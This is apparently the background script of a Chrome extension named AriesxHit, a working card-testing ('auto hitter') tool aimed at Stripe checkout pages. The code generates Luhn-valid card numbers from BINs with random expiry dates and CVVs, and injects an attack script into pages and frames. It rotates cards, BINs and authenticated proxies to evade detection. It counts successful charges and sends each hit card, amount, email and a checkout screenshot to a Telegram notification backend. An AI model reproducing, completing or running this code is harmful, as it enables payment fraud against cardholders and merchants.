// ===================================
// ARIESXHIT BACKGROUND - Auto Hitter
// ===================================

importScripts('tg-config.js');

const state = {
  cardList: [],
  binList: [],
  autoHitActive: false,
  logs: [],
  stats: { hits: 0, tested: 0, declined: 0 },
  monitoredTabs: new Set(),
  proxyList: [],
  proxyIndex: 0,
  proxyEnabled: false,
};

// Parse single proxy line. Supports: host:port | host:port:user:pass | user:pass@host:port
function parseProxyLine(line) {
  line = String(line).trim();
  if (!line) return null;
  const at = line.indexOf('@');
  if (at > 0) {
    const auth = line.slice(0, at);
    const hostPort = line.slice(at + 1);
    const hp = hostPort.split(':');
    if (hp.length >= 2) {
      const port = parseInt(hp[hp.length - 1], 10);
      const host = hp.slice(0, -1).join(':').trim();
      const colon = auth.indexOf(':');
      const user = colon >= 0 ? auth.slice(0, colon) : auth;
      const pass = colon >= 0 ? auth.slice(colon + 1) : '';
      return { host, port: isNaN(port) ? 8080 : port, user, pass };
    }
  }
  const parts = line.split(':');
  if (parts.length === 2) {
    const port = parseInt(parts[1], 10);
    return { host: parts[0].trim(), port: isNaN(port) ? 8080 : port };
  }
  if (parts.length >= 4) {
    const host = parts[0].trim();
    const port = parseInt(parts[1], 10);
    const user = parts[2];
    const pass = parts.slice(3).join(':');
    return { host, port: isNaN(port) ? 8080 : port, user, pass };
  }
  return null;
}

function parseProxies(raw) {
  if (!raw || typeof raw !== 'string') return [];
  return raw.split(/\r?\n/).map(parseProxyLine).filter(Boolean);
}

function applyProxy(proxyObj) {
  if (!proxyObj || !proxyObj.host || !chrome.proxy?.settings?.set) return;
  const config = {
    mode: 'fixed_servers',
    rules: {
      singleProxy: {
        scheme: 'http',
        host: proxyObj.host,
        port: proxyObj.port,
      },
      bypassList: ['localhost', '127.0.0.1'],
    },
  };
  chrome.proxy.settings.set({ value: config, scope: 'regular' }, () => {
    if (chrome.runtime.lastError) console.warn('[AriesxHit] Proxy apply failed:', chrome.runtime.lastError);
  });
}

function clearProxy() {
  if (!chrome.proxy?.settings?.set) return;
  chrome.proxy.settings.set({ value: { mode: 'system' }, scope: 'regular' }, () => {});
}

chrome.storage.local.get(['cardList', 'binList', 'logs', 'stats', 'autoHitActive', 'ax_proxy', 'ax_proxy_enabled', 'ax_proxy_index'], (r) => {
  if (r.cardList) state.cardList = r.cardList;
  if (r.binList) state.binList = r.binList;
  if (r.logs) state.logs = r.logs;
  if (r.stats) state.stats = r.stats;
  if (r.autoHitActive !== undefined) state.autoHitActive = r.autoHitActive;
  state.proxyList = parseProxies(r.ax_proxy);
  state.proxyEnabled = r.ax_proxy_enabled === true;
  state.proxyIndex = Math.max(0, parseInt(r.ax_proxy_index, 10) || 0) % Math.max(1, state.proxyList.length);
  if (state.proxyEnabled && state.proxyList.length) {
    const p = state.proxyList[state.proxyIndex];
    if (p) applyProxy(p);
  } else {
    clearProxy();
  }
  setupWebRequest();
  console.log('[AriesxHit] Auto Hitter ready');
});

function setupWebRequest() {
  const urls = ['*://*.stripe.com/*', '*://*.stripe.network/*'];
  chrome.webRequest.onBeforeRequest.addListener(handleBeforeRequest, { urls }, ['requestBody']);
  chrome.webRequest.onCompleted.addListener(handleCompleted, { urls });
  // Proxy auth: provide credentials when proxy returns 407 (required for Webshare etc.)
  if (chrome.webRequest?.onAuthRequired) {
    chrome.webRequest.onAuthRequired.addListener(
      (details, callback) => {
        if (!details.isProxy) { callback({}); return; }
        const p = state.proxyList[state.proxyIndex];
        if (!state.proxyEnabled || !p?.user) {
          callback({});
          return;
        }
        const host = (details.challenger?.host || '').toLowerCase();
        const port = parseInt(details.challenger?.port, 10);
        const match = host === (p.host || '').toLowerCase() && (isNaN(port) || port === (p.port || 80));
        if (match) {
          callback({ authCredentials: { username: p.user, password: p.pass || '' } });
        } else {
          callback({});
        }
      },
      { urls: ['<all_urls>'] },
      ['asyncBlocking']
    );
  }
}

function handleBeforeRequest(details) {}

function handleCompleted(details) {}

function isStripePage(url) {
  if (!url || !url.startsWith('http')) return false;
  return true;
}

function isStripeCheckoutUrl(url) {
  if (!url || !url.startsWith('http')) return false;
  const u = url.toLowerCase();
  if (u.includes('checkout.stripe.com') || u.includes('stripe.com/c/pay')) return true;
  if (/\/c\/pay\/|\/pay\/|checkout|billing/i.test(url)) return true;
  return false;
}

function injectAutoHitter(tabId, forceStateUpdate) {
  const alreadyMonitored = state.monitoredTabs.has(tabId);
  if (alreadyMonitored && !forceStateUpdate) return;
  if (forceStateUpdate && tabId) {
    chrome.tabs.sendMessage(tabId, { type: 'STATE_UPDATE', autoHitActive: state.autoHitActive, cardList: state.cardList, binList: state.binList }).catch(() => {});
  }
  chrome.scripting.executeScript({
    target: { tabId, allFrames: true },
    func: (url) => {
      if (document.querySelector('script[data-aries-autohit]')) return;
      const s = document.createElement('script');
      s.src = url;
      s.dataset.ariesAutohit = '1';
      s.onload = () => s.remove();
      (document.head || document.documentElement).appendChild(s);
    },
    args: [chrome.runtime.getURL('scripts/autohitter/core.js')],
  }).then(() => {
    state.monitoredTabs.add(tabId);
    setTimeout(() => {
      chrome.tabs.sendMessage(tabId, { type: 'STATE_UPDATE', autoHitActive: state.autoHitActive, cardList: state.cardList, binList: state.binList }).catch(() => {});
    }, 150);
  }).catch(() => {});
}

chrome.tabs.onUpdated.addListener((tabId, info, tab) => {
  if (tab?.url && isStripePage(tab.url)) injectAutoHitter(tabId);
  if (info.status === 'complete' && tab?.url && isStripeCheckoutUrl(tab.url)) {
    state.stats = { hits: 0, tested: 0, declined: 0 };
    chrome.storage.local.set({ stats: state.stats });
    chrome.tabs.sendMessage(tabId, { type: 'STATE_UPDATE', resetAttempts: true, attempts: 0, hits: 0 }).catch(() => {});
  }
});

chrome.tabs.onRemoved.addListener((tabId) => state.monitoredTabs.delete(tabId));

chrome.webNavigation?.onDOMContentLoaded?.addListener(
  (d) => { if (isStripePage(d.url)) injectAutoHitter(d.tabId); },
  { url: [{ schemes: ['https', 'http'] }] }
);

function broadcastToPopups(msg) {
  chrome.runtime.sendMessage(msg).catch(() => {});
}

function fixLuhn(num) {
  const digits = num.split('').map(Number);
  let sum = 0;
  for (let i = 0; i < digits.length - 1; i++) {
    let d = digits[i];
    if ((digits.length - 1 - i) % 2 === 1) { d *= 2; if (d > 9) d -= 9; }
    sum += d;
  }
  return num.slice(0, -1) + ((10 - (sum % 10)) % 10);
}

function isAmexBin(bin) {
  const b = String(bin).replace(/\D/g, '');
  return b.startsWith('34') || b.startsWith('37');
}

function generateCardsFromBins(bins) {
  const out = [];
  for (const bin of bins) {
    const b = String(bin).replace(/\D/g, '').slice(0, 8);
    if (b.length < 6) continue;
    const amex = isAmexBin(b);
    const cardLen = amex ? 15 : 16;
    const need = cardLen - b.length;
    const cvvLen = amex ? 4 : 3;
    for (let i = 0; i < 3; i++) {
      let suffix = '';
      for (let j = 0; j < need - 1; j++) suffix += Math.floor(Math.random() * 10);
      suffix += '0';
      let num = (b + suffix).slice(0, cardLen);
      num = fixLuhn(num);
      const m = String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
      const y = String((new Date().getFullYear() % 100) + Math.floor(Math.random() * 5) + 1).padStart(2, '0');
      const cvvMin = cvvLen === 4 ? 1000 : 100;
      const cvvMax = cvvLen === 4 ? 9999 : 999;
      const cvv = String(Math.floor(cvvMin + Math.random() * (cvvMax - cvvMin + 1)));
      out.push(`${num}|${m}|${y}|${cvv}`);
    }
  }
  return out.length ? out : ['4242424242424242|12|28|123'];
}

function broadcastToTabs(msg, originTabId) {
  const tabsToNotify = new Set(state.monitoredTabs);
  if (originTabId) tabsToNotify.add(originTabId);
  tabsToNotify.forEach((tabId) => {
    chrome.tabs.sendMessage(tabId, msg).catch(() => {});
  });
}

let _screenshotInProgress = false;
function captureCheckoutScreenshot(tab, cardStr) {
  if (!tab?.windowId || !chrome.tabs?.captureVisibleTab || !chrome.downloads?.download) return;
  if (_screenshotInProgress) return;
  _screenshotInProgress = true;
  const releaseLock = () => { _screenshotInProgress = false; };
  setTimeout(releaseLock, 4000);
  const now = new Date();
  const iso = now.toISOString().replace(/[:.]/g, '-');
  chrome.storage.local.get(['ax_screenshot_format'], (r) => {
    const fmt = (r.ax_screenshot_format || 'ARIESxHit_{timestamp}').trim() || 'ARIESxHit_{timestamp}';
    const base = fmt.replace(/\{timestamp\}/gi, iso + 'Z').replace(/[<>:"/\\|?*]/g, '_');
    const filename = base.endsWith('.png') ? base : base + '.png';
    chrome.tabs.captureVisibleTab(tab.windowId, { format: 'png' }, (dataUrl) => {
      if (chrome.runtime.lastError || !dataUrl) return;
      chrome.downloads.download({
        url: dataUrl,
        filename,
        saveAs: false,
        conflictAction: 'uniquify'
      }, () => {});
    });
  });
}

chrome.runtime.onMessage.addListener((msg, sender, respond) => {
  switch (msg.type) {
    case 'CARD_TRYING':
      if (!state._attemptStartTime) state._attemptStartTime = Date.now();
      state.stats.tested++;
      state.logs.push({ type: 'log', subtype: 'trying', attempt: msg.attempt, card: msg.card, timestamp: Date.now() });
      if (state.logs.length > 200) state.logs.shift();
      chrome.storage.local.set({ logs: state.logs, stats: state.stats });
      broadcastToPopups(msg);
      broadcastToTabs(msg, sender?.tab?.id);
      broadcastToTabs({ type: 'STATS_UPDATE', attempts: state.stats.tested, hits: state.stats.hits }, sender?.tab?.id);
      respond({ ok: true });
      break;

    case 'CARD_ERROR':
      state.stats.declined++;
      state.logs.push({ type: 'log', subtype: 'error', code: msg.code, decline_code: msg.decline_code, message: msg.message, timestamp: Date.now() });
      if (state.logs.length > 200) state.logs.shift();
      chrome.storage.local.set({ logs: state.logs, stats: state.stats });
      broadcastToPopups(msg);
      broadcastToTabs(msg, sender?.tab?.id);
      broadcastToTabs({ type: 'STATS_UPDATE', attempts: state.stats.tested, hits: state.stats.hits }, sender?.tab?.id);
      respond({ ok: true });
      break;

    case 'CARD_HIT': {
      const tabId = sender?.tab?.id;
      const now = Date.now();
      if (state._lastCardHitTab === tabId && now - (state._lastCardHitTime || 0) < 5000) {
        respond({ ok: true }); break;
      }
      state._lastCardHitTab = tabId;
      state._lastCardHitTime = now;
      state.stats.hits++;
      if (state.stats.tested < state.stats.hits) state.stats.tested = state.stats.hits;
      const hitData = { ...msg, attempt: state.stats.tested };
      state.logs.push({ type: 'log', subtype: 'hit', card: msg.card, attempt: state.stats.tested, timestamp: Date.now() });
      if (state.logs.length > 200) state.logs.shift();
      const hitTime = new Date().toLocaleTimeString('en-US', { hour12: true });
      chrome.storage.local.set({ logs: state.logs, stats: state.stats, ax_last_hit: hitTime });
      broadcastToPopups(hitData);
      broadcastToTabs(hitData, sender?.tab?.id);
      broadcastToTabs({ type: 'STATS_UPDATE', attempts: state.stats.tested, hits: state.stats.hits }, sender?.tab?.id);

      // Debug logging for card data
      console.log('[CARD_HIT] RECEIVED HIT DATA:', {
        card: msg.card || 'NO_CARD_DATA',
        amount: msg.amount || 'NO_AMOUNT_DATA',
        success_url: msg.success_url || 'NO_URL_DATA',
        attempts: state.stats.tested,
        full_msg: msg
      });
      chrome.storage.local.get(['ax_tg_id', 'ax_tg_name', 'ax_api_url', 'ax_auto_screenshot', 'ax_screenshot_tg', 'ax_tg_hits', 'ax_fill_email'], (r) => {
        console.log('[CARD_HIT] Retrieved from storage:', {
          ax_tg_id: r.ax_tg_id || 'NO_TG_ID',
          ax_fill_email: r.ax_fill_email || 'NO_EMAIL',
          ax_api_url: r.ax_api_url || 'NO_API_URL'
        });
        const base = (r.ax_api_url || (typeof TGConfig !== 'undefined' ? TGConfig.BOT_URL : 'http://localhost:3000')).replace(/\/$/, '');
        if (!r.ax_tg_id || !base) {
          if (!r.ax_tg_id) chrome.storage.local.set({ ax_last_tg_notify_error: 'Telegram ID not set. Log in via OTP first.' });
          return;
        }
        if (r.ax_tg_hits === false) return;
        const tab = sender?.tab;
        const attemptStart = state._attemptStartTime || now;
        const durationSec = Math.round((now - attemptStart) / 1000);
        const payload = {
          tg_id: r.ax_tg_id,
          name: r.ax_tg_name || 'User',
          card: msg.card,
          attempts: state.stats.tested,
          amount: msg.amount || '',
          success_url: msg.success_url || tab?.url || '',
          email: r.ax_fill_email || '',
          time_sec: durationSec,
        };
        const doNotify = (screenshotB64) => {
          if (screenshotB64) payload.screenshot = screenshotB64;
          fetch(base + '/api/tg/notify-hit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
          })
            .then(async (res) => {
              const text = await res.text();
              try {
                return text ? JSON.parse(text) : {};
              } catch {
                return { ok: false, error: res.ok ? 'Invalid server response' : `Server ${res.status}` };
              }
            })
            .then((data) => {
              if (data && data.ok) chrome.storage.local.remove(['ax_last_tg_notify_error']);
              else chrome.storage.local.set({ ax_last_tg_notify_error: data?.error || 'Telegram notify failed' });
            })
            .catch((e) => {
              const msg = e?.message || 'Network error';
              const hint = msg.toLowerCase().includes('fetch') ? ` Ensure backend is running at ${base}` : '';
              chrome.storage.local.set({ ax_last_tg_notify_error: msg + hint });
            });
        };
        if (r.ax_screenshot_tg && tab?.windowId && chrome.tabs?.captureVisibleTab) {
          chrome.tabs.captureVisibleTab(tab.windowId, { format: 'png' }, (dataUrl) => {
            if (dataUrl && typeof dataUrl === 'string') {
              doNotify(dataUrl.replace(/^data:image\/\w+;base64,/, ''));
            } else {
              doNotify();
            }
          });
        } else {
          doNotify();
        }
        if (r.ax_auto_screenshot !== false && tab?.windowId) {
          setTimeout(() => captureCheckoutScreenshot(tab, msg.card), 2000);
        }
      });
      respond({ ok: true });
      break;
    }

    case 'GET_STATE':
      respond({ autoHitActive: state.autoHitActive, cardList: state.cardList, binList: state.binList, stats: state.stats });
      break;

    case 'RESET_STATS_NEW_CHECKOUT': {
      state.stats = { hits: 0, tested: 0, declined: 0 };
      state._lastCardHitTab = null;
      state._attemptStartTime = null;
      chrome.storage.local.set({ stats: state.stats });
      state.monitoredTabs.forEach((tabId) => {
        chrome.tabs.sendMessage(tabId, { type: 'STATE_UPDATE', resetAttempts: true, attempts: 0, hits: 0 }).catch(() => {});
      });
      respond({ ok: true });
      break;
    }

    case 'START_AUTO_HIT': {
      state.autoHitActive = true;
      state.stats.tested = 0;
      state._attemptStartTime = null;
      let cards = msg.data?.cards ?? [];
      const bins = msg.data?.bins ?? [];
      if (bins.length) {
        state.cardList = generateCardsFromBins(bins);
        state.binList = bins;
      } else {
        state.cardList = Array.isArray(cards) ? cards : [];
      }
      chrome.storage.local.set({ cardList: state.cardList, binList: state.binList || [], autoHitActive: true, stats: state.stats });
      const tabId = sender?.tab?.id;
      if (tabId) injectAutoHitter(tabId, true);
      state.monitoredTabs.forEach((id) => {
        chrome.tabs.sendMessage(id, { type: 'STATE_UPDATE', autoHitActive: true, cardList: state.cardList, binList: state.binList, resetAttempts: true, attempts: state.stats.tested, hits: state.stats.hits }).catch(() => {});
      });
      respond({ ok: true, cardList: state.cardList });
      break;
    }

    case 'STOP_AUTO_HIT':
      state.autoHitActive = false;
      chrome.storage.local.set({ autoHitActive: false });
      state.monitoredTabs.forEach((tabId) => {
        chrome.tabs.sendMessage(tabId, { type: 'STATE_UPDATE', autoHitActive: false, attempts: state.stats.tested, hits: state.stats.hits }).catch(() => {});
      });
      respond({ ok: true });
      break;

    case 'GET_LOGS':
      respond({ logs: state.logs, stats: state.stats });
      break;

    case 'CLEAR_LOGS':
      state.logs = [];
      state.stats = { hits: 0, tested: 0, declined: 0 };
      chrome.storage.local.set({ logs: state.logs, stats: state.stats });
      respond({ ok: true });
      break;

    case 'CLEAR_LOGS_ONLY':
      state.logs = [];
      chrome.storage.local.set({ logs: state.logs });
      respond({ ok: true });
      break;

    case 'SWITCH_BIN': {
      function doSwitchBin(bins) {
        if (!bins || bins.length < 2) {
          respond({ ok: true, bin: null, binList: state.binList, cardList: state.cardList });
          return;
        }
        const rotated = bins.slice(1).concat(bins[0]);
        state.binList = rotated;
        const currentBin = state.binList[0];
        state.cardList = generateCardsFromBins([currentBin]);
        chrome.storage.local.set({ cardList: state.cardList, binList: state.binList, savedBins: rotated });
        state.monitoredTabs.forEach((tabId) => {
          chrome.tabs.sendMessage(tabId, { type: 'STATE_UPDATE', cardList: state.cardList, binList: state.binList }).catch(() => {});
        });
        respond({ ok: true, bin: currentBin, binList: state.binList, cardList: state.cardList });
      }
      const passedBins = msg.bins;
      if (passedBins && Array.isArray(passedBins) && passedBins.length >= 2) {
        doSwitchBin(passedBins);
      } else if (state.binList.length >= 2) {
        doSwitchBin(state.binList);
      } else {
        chrome.storage.local.get(['savedBins'], (r) => {
          const saved = r.savedBins || [];
          if (saved.length >= 2) {
            doSwitchBin(saved);
          } else {
            respond({ ok: true, bin: null, binList: state.binList, cardList: state.cardList });
          }
        });
        return true;
      }
      break;
    }

    case 'SWITCH_CARD': {
      if (!state.cardList.length) {
        respond({ ok: true, card: null, bin: null });
        break;
      }
      const moved = state.cardList.shift();
      state.cardList.push(moved);
      const nextCard = state.cardList[0];
      const bin = (nextCard && nextCard.split('|')[0]) ? nextCard.split('|')[0].slice(0, 8) : (state.binList[0] || '');
      chrome.storage.local.set({ cardList: state.cardList });
      state.monitoredTabs.forEach((tabId) => {
        chrome.tabs.sendMessage(tabId, { type: 'STATE_UPDATE', cardList: state.cardList }).catch(() => {});
      });
      respond({ ok: true, card: nextCard, bin });
      break;
    }

    case 'CAPTURE_CHECKOUT_TAB': {
      const tabId = sender?.tab?.id;
      const now = Date.now();
      if (state._lastScreenshotTab === tabId && now - (state._lastScreenshotTime || 0) < 3000) {
        respond({ ok: true }); break;
      }
      state._lastScreenshotTab = tabId;
      state._lastScreenshotTime = now;
      chrome.storage.local.get(['ax_auto_screenshot'], (sr) => {
        if (sr.ax_auto_screenshot === false) return;
        const tab = sender?.tab;
        if (tab?.windowId) captureCheckoutScreenshot(tab);
      });
      respond({ ok: true });
      break;
    }

    case 'SCREENSHOT_DATA': {
      if (_screenshotInProgress) { respond({ ok: true }); break; }
      const dataUrl = msg.dataUrl;
      if (!dataUrl || typeof dataUrl !== 'string') { respond({ ok: false }); break; }
      const now = new Date();
      const iso = now.toISOString().replace(/[:.]/g, '-');
      chrome.storage.local.get(['ax_screenshot_format'], (r) => {
        const fmt = (r.ax_screenshot_format || 'ARIESxHit_{timestamp}').trim() || 'ARIESxHit_{timestamp}';
        const base = fmt.replace(/\{timestamp\}/gi, iso + 'Z').replace(/[<>:"/\\|?*]/g, '_');
        const filename = base.endsWith('.png') ? base : base + '.png';
        chrome.downloads.download({
          url: dataUrl,
          filename,
          saveAs: false,
          conflictAction: 'uniquify'
        }, () => { respond({ ok: true }); });
      });
      return true;
    }

    case 'INJECT_BYPASS':
      if (sender?.tab?.id) injectAutoHitter(sender.tab.id);
      respond({ ok: true });
      break;

    case 'GET_IP':
      fetch('https://api.ipify.org?format=json')
        .then((r) => r.json())
        .then((d) => respond({ ip: d.ip || '' }))
        .catch(() => respond({ ip: '' }));
      return true;

    case 'APPLY_PROXY': {
      const raw = msg.proxyText ?? msg.data?.proxyText ?? '';
      const enabled = msg.enabled !== false;
      state.proxyList = parseProxies(raw);
      state.proxyEnabled = enabled && state.proxyList.length > 0;
      state.proxyIndex = 0;
      chrome.storage.local.set({
        ax_proxy: raw,
        ax_proxy_enabled: state.proxyEnabled,
        ax_proxy_index: 0,
      });
      if (state.proxyEnabled && state.proxyList.length) {
        applyProxy(state.proxyList[0]);
        respond({ ok: true, enabled: true, count: state.proxyList.length, current: state.proxyList[0] });
      } else {
        clearProxy();
        respond({ ok: true, enabled: false, count: 0 });
      }
      break;
    }

    case 'CLEAR_PROXY':
      state.proxyEnabled = false;
      state.proxyList = [];
      state.proxyIndex = 0;
      clearProxy();
      chrome.storage.local.set({ ax_proxy_enabled: false, ax_proxy_index: 0 });
      respond({ ok: true });
      break;

    case 'ROTATE_PROXY': {
      if (!state.proxyList.length) {
        respond({ ok: true, proxy: null, index: 0, count: 0 });
        break;
      }
      state.proxyIndex = (state.proxyIndex + 1) % state.proxyList.length;
      const p = state.proxyList[state.proxyIndex];
      if (state.proxyEnabled && p) applyProxy(p);
      chrome.storage.local.set({ ax_proxy_index: state.proxyIndex });
      respond({ ok: true, proxy: p, index: state.proxyIndex, count: state.proxyList.length });
      break;
    }

    case 'GET_PROXY_STATE':
      respond({
        proxyList: state.proxyList,
        proxyIndex: state.proxyIndex,
        proxyEnabled: state.proxyEnabled,
        currentProxy: state.proxyList[state.proxyIndex] || null,
      });
      break;

    default:
      respond({ ok: true });
  }
  return true;
});

chrome.runtime.onInstalled.addListener(() => {
  chrome.storage.local.set({ logs: [], stats: { hits: 0, tested: 0, declined: 0 } });
});

chrome.action.onClicked.addListener(() => {
  chrome.tabs.create({ url: chrome.runtime.getURL('dashboard.html') });
});
